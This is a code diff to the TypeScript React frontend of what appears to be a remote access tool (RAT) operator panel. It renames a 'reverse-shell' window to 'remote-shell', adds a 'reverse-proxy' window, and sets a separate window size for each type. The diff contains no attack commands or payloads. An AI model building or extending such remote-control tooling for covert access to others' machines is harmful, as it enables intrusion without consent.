@@ -20,11 +20,36 @@ const translateWindowType = (type: string) => {
       return "Remote Desktop";
     case "file-manager":
       return "File Manager";
-    case "reverse-shell":
-      return "Reverse Shell";
+    case "remote-shell":
+      return "Remote Shell";
+    case "reverse-proxy":
+      return "Reverse Proxy";
     default:
       return type;
   }
+};
+
+const windowTypeSizes = {
+  "reverse-proxy": {
+    width: 920,
+    height: 260,
+  },
+  "remote-desktop": {
+    width: 1280,
+    height: 720,
+  },
+  "file-manager": {
+    width: 1280,
+    height: 720,
+  },
+  "process-viewer": {
+    width: 1280,
+    height: 720,
+  },
+  "remote-shell": {
+    width: 1280,
+    height: 700,
+  },
 };
 
 export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
@@ -109,8 +134,8 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
       const window = new WebviewWindow(windowId, {
         url: fullUrl,
         title: `${translateWindowType(type)} - ${clientFullName} - ${addr}`,
-        width: 1280,
-        height: 720,
+        width: windowTypeSizes[type as keyof typeof windowTypeSizes].width,
+        height: windowTypeSizes[type as keyof typeof windowTypeSizes].height,
         resizable: true,
         center: true,
       });
